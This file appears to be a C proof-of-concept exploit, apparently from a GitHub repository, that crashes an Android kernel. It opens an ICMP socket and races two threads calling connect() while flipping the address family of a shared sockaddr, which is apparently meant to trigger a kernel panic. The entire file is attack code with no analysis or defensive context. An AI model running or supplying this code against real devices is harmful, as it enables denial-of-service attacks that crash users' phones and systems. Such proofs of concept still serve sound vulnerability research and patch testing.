// Source: https://raw.githubusercontent.com/danieljiang0415/android_kernel_crash_poc/master/panic.c

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
static int sockfd = 0;
static struct sockaddr_in addr = {0};

void fuzz(void * param){
    while(1){
        addr.sin_family = 0;//rand()%42;
        printf("sin_family1 = %08lx\n", addr.sin_family);
        connect(sockfd, (struct sockaddr *)&addr, 16);
    }
}
int main(int argc, char **argv)
{
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
    int thrd;
    pthread_create(&thrd, NULL, fuzz, NULL);
    while(1){
        addr.sin_family = 0x1a;//rand()%42;
        addr.sin_port = 0;
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        connect(sockfd, (struct sockaddr *)&addr, 16);
        addr.sin_family = 0;
    }
    return 0;
}